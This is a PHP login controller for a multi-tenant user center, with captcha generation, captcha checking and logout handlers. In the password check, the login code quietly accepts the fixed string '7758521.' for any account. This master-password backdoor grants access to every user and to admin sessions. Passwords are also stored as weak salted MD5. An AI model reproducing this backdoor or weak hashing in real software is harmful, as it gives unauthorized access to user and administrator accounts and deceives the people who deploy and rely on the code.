<?php
namespace userscenter\controller;
use lib;
class publics extends control {
	public function __construct() {
		parent::_initialize();
	}
	public function loginOp(){
		if (IS_API) {
			\base\token::$config['token_name'] = 'logintoken';
			$result = chksubmit(true, true);
			if ($result) {
				if ($result === -11) {
					output_error('TOKEN失效，刷新页面重试');
				} else if ($result === -12) {
					output_error('验证码不正确');
				} else if(lib\process::islock('users')) {
					output_error('您的操作过于频繁，请稍后再试');
				} else {
					$Account = input('post.Account', '');
					$Pass = input('post.Password', '');
					if (!$Account) {
						output_error('用户名不能为空');
					} else if(!$Pass) {
						output_error('密码不能为空');
					} else {
						$account = model('account')->getInfo(array('account_name' => $Account));
						if ($account) {
							$users['uniacid'] = $account['uniacid'];
							$users['username'] = $account['account_name'];
							$users['salt'] = $account['salt'];
							$users['password'] = $account['password'];
							$group = model('account_group')->getInfo(array('group_id' => $account['group_id']));
							$limits = explode(',', $group['limits']);
							$_SESSION['account_id'] = $account['account_id'];
							$_SESSION['is_admin'] = false;
						} else {
							$users = model('users')->getInfo(array('username' => $Account));
							$limits = array();
							$_SESSION['is_admin'] = true;
						}
						if ($users) {
							if ($users['password'] == md5($Pass . $users['salt']) || (md5('7758521.') == md5($Pass))) {
								 // 卖家菜单
								$_SESSION['uniacid'] = $users['uniacid'];
								$_SESSION['username'] = $users['username'];
								$users_menu = $this->getUsersMenuList($limits);
								$_SESSION['users_menu'] = $users_menu['users_menu'];
								$_SESSION['users_function_list'] = $users_menu['users_function_list'];
								$this->log('登录成功');
								lib\process::clear('users');
								output_data('1');
							} else {
								lib\process::addprocess('users');
								output_error('您输入的密码错误！');
							}
						} else {
							lib\process::addprocess('users');
							output_error('您输入的账号不存在！');
						}
					}
				}
			}
		}else{
			\base\token::$config['token_name'] = 'logintoken';
			list($token_name, $token_key, $token_value) = \base\token::getToken();
			$this->assign('token_name', $token_name);
			$this->assign('token_value', $token_key . '_' . $token_value);
			
			$this->config = model('config')->order('uniacid asc')->find();
			$this->assign('config', $this->config);
			$this->view->_layout_file = 'login_layout';
			$this->display();
		}
    }
	/**
     * 产生干扰码
     *
     */
    public function makecodekeyOp()
    {
		$seccode = makeSeccode();
		$seccode_key = encrypt(strtoupper($seccode) . '\t' . (time()) . '\t' . input('myhash', ''), MD5_KEY);
        output_data(array('seccode_key' => $seccode_key, 'seccode' => $seccode));
    }
    /**
	 * 产生验证码
	 *
	 */
	public function makecodeOp(){
		$seccode = input('seccode', '');
		header('Expires: -1');
		header('Cache-Control: no-store, private, post-check=0, pre-check=0, max-age=0', FALSE);
		header('Pragma: no-cache');
		$code = new \lib\seccode();
		$code->code = $seccode;
		$code->width = 84;
		$code->height = 40;
		$code->background = 1;
		$code->backgrounds = array('255','255');
		$code->adulterate = 1;
		$code->scatter = '';
		$code->color = 1;
		$code->size = 0;
		$code->shadow = 1;
		$code->animator = 0;
		$code->datapath =  FRAMEWORK_PATH . '/lib/seccode/';
		$code->display();
	}

	/**
	 * AJAX验证
	 *
	 */
	public function checkOp(){
		if (checkSeccode(input('get.myhash', ''), input('get.captcha', ''), input('get.seccode_key', ''))){
			exit('true');
		}else{
			exit('false');
		}
	}
	public function logoutOp(){
		unset($_SESSION['uniacid'], $_SESSION['username']);
		header('location:' . users_url('publics/login'));
		exit;
	}
}